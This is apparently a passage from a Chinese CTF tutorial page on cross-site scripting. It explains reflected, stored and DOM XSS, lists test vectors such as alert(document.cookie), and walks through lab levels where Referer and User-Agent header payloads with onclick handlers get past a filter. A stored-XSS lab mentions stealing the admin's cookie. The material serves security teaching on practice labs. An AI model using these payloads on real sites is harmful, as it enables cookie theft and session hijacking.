+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-tags/web/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-tags/web/sql-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-tags/web/sqlmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQLMap
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-tags/web/PHP_features/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PHP特性
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-tags/misc/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Misc
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Misc
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-tags/reverse/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reverse
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Reverse
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-tags/pwn/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pwn
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Pwn
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../Event/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    赛事
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    赛事
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Event/Upcoming_events/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    即将开始
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Event/Now_running/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    正在进行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Event/Past_events/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    已经结束
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    办赛指南
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    办赛指南
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Event/organize.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    None
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-labs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    靶场
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../hc-toolkit/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    工具
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    工具
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hc-archive/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    归档
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        类型介绍
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="类型介绍">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reflected-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        反射型(Reflected XSS)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stored-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        存储型(Stored XSS)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#domdom-based-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DOM型(DOM-based XSS)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        常见攻击向量
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实战
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实战">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        存储型 XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#referer-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Referer XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-agent-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        User-Agent XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cookie XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#angular-js-ng-include-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Angular JS ng-include XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        回车代替空格绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        短标签绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#angular-js-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Angular JS 模板注入 XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dom-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DOM 跳转 XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        / 代替空格绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        URL XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        闭合绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        事件绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-href" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        a href 绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        大小写绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        双写绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unicode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unicode 编码绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        注释绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+    <a
+      href="https://github.com/ProbiusOfficial/Hello-CTF/tree/main/docs/hc-web/xss.md"
+      title="编辑此页"
+      class="md-content__button md-icon"
+    >
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+
+  <!-- View button -->
+  
+    
+      
+    
+    <a
+      href="https://github.com/ProbiusOfficial/Hello-CTF/tree/main/docs/hc-web/xss.md"
+      title="查看本页的源代码"
+      class="md-content__button md-icon"
+    >
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<!-- Page content -->
+<div><h1 id="xsscross-site-scripting">XSS跨站脚本(Cross-Site Scripting)<a class="headerlink" href="#xsscross-site-scripting" title="Permanent link">¶</a></h1>
+<h2 id="_1">类型介绍<a class="headerlink" href="#_1" title="Permanent link">¶</a></h2>
+<h3 id="reflected-xss">反射型(Reflected XSS)<a class="headerlink" href="#reflected-xss" title="Permanent link">¶</a></h3>
+<p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中</p>
+<p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+<h3 id="stored-xss">存储型(Stored XSS)<a class="headerlink" href="#stored-xss" title="Permanent link">¶</a></h3>
+<p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p>
+<p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+<h3 id="domdom-based-xss">DOM型(DOM-based XSS)<a class="headerlink" href="#domdom-based-xss" title="Permanent link">¶</a></h3>
+<p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p>
+<h2 id="_2">常见攻击向量<a class="headerlink" href="#_2" title="Permanent link">¶</a></h2>
+<p>1.alert()</p>
+<p>alert('xss')</p>
+<p>alert("xss")</p>
+<p>alert(/xss/)</p>
+<p>alert(document.cookie)</p>
+<p>2.confirm()</p>
+<p>confirm('xss')</p>
+<p>confirm("xss")</p>
+<p>confirm(/xss/)</p>
+<p>confirm(document.cookie)</p>
+<p>3.prompt()</p>
+<p>prompt('xss')</p>
+<p>prompt("xss")</p>
+<p>prompt(/xss/)</p>
+<p>prompt(document.cookie)</p>
+<p>(/xss/)以上三种方法都可以实现，但是会多出两个‘/’</p>
+<h2 id="_3">实战<a class="headerlink" href="#_3" title="Permanent link">¶</a></h2>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-1.md -->
+<h3 id="xss">存储型 XSS<a class="headerlink" href="#xss" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18a2dd0e0a243d4ffc56a.jpg"></p>
+<p>留言功能网页，先输入正常数据测试</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18a3ed0e0a243d4ffc56b.jpg"></p>
+<p>被插入到了网页中</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18a4dd0e0a243d4ffc56c.jpg"></p>
+<p>输入恶意 XSS 弹窗代码</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18aacd0e0a243d4ffc56d.jpg"></p>
+<p>没有触发，需要切换用户访问</p>
+<p>官方推荐的是使用第三方 XSS 接收平台</p>
+<p>这里直接访问管理员后台，密码是 011be4d65feac1a8（环境有问题扫不出一个 sql 文件了）</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18ad0d0e0a243d4ffc56f.jpg"></p>
+<p>登录后台有触发了弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18ae3d0e0a243d4ffc571.jpg"></p>
+<p>我们插入获取 cookie 值的恶意脚本</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18af2d0e0a243d4ffc572.jpg"></p>
+<p>再次登录拿到了 flag</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18b00d0e0a243d4ffc573.jpg"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-10.md -->
+<h3 id="referer-xss">Referer XSS<a class="headerlink" href="#referer-xss" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第十一关</strong></p>
+<p>看一下源码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>&lt;head&gt;
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>&lt;script&gt;
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>window.alert = function()  
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>{     
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>confirm("完成的不错！");
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a> window.location.href="level12.php?keyword=good job!"; 
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>}
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>&lt;/script&gt;
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>&lt;title&gt;欢迎来到level11&lt;/title&gt;
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>&lt;/head&gt;
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>&lt;body&gt;
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>&lt;?php 
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>$str = $_GET["keyword"];
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>$str00 = $_GET["t_sort"];
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>$str11=$_SERVER['HTTP_REFERER'];    // 接收 Referer 字段
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>$str22=str_replace("&gt;","",$str11);
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>$str33=str_replace("&lt;","",$str22);
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>&lt;form id=search&gt;
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>&lt;input name="t_link"  value="'.'" type="hidden"&gt;
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>&lt;input name="t_history"  value="'.'" type="hidden"&gt;
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>&lt;input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden"&gt;
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>&lt;input name="t_ref"  value="'.$str33.'" type="hidden"&gt;
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>&lt;/form&gt;
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>&lt;/center&gt;';
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>?&gt;
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>&lt;?php 
+<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str)."&lt;/h3&gt;";
+<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>?&gt;
+<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>&lt;/body&gt;
+<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>&lt;/html&gt;
+</code></pre></div>
+<p>过滤了 <code>&lt;&gt;</code>，不能直接插入 payload，但是没有过滤 <code>""</code> 考虑下事件绕过</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Referer: " onclick=javascript:alert() type="text
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68146ee158cb8da5c8d68a5c.png"></p>
+<p>点击弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68146efe58cb8da5c8d68a5e.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-11.md -->
+<h3 id="user-agent-xss">User-Agent XSS<a class="headerlink" href="#user-agent-xss" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第十二关</strong></p>
+<p>查看源代码发现这次插入的是 <code>User-Agent</code> 头</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6814723558cb8da5c8d68a9a.png"></p>
+<p>继续使用上一关的 payload</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>User-Agent: " onclick=javascript:alert() type="text
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681472e058cb8da5c8d68aac.png"></p>
+<p>成功弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6814730758cb8da5c8d68ab2.png"></p>
+<p>看一下源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>&lt;head&gt;
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>&lt;script&gt;
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>window.alert = function()  
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>{     
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>confirm("完成的不错！");
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a> window.location.href="level13.php?keyword=good job!"; 
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>}
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>&lt;/script&gt;
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>&lt;title&gt;欢迎来到level12&lt;/title&gt;
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>&lt;/head&gt;
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>&lt;body&gt;
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>&lt;?php 
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>$str = $_GET["keyword"];
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>$str00 = $_GET["t_sort"];
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>$str11=$_SERVER['HTTP_USER_AGENT'];     // 接收 User-Agent
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>$str22=str_replace("&gt;","",$str11);
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>$str33=str_replace("&lt;","",$str22);
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
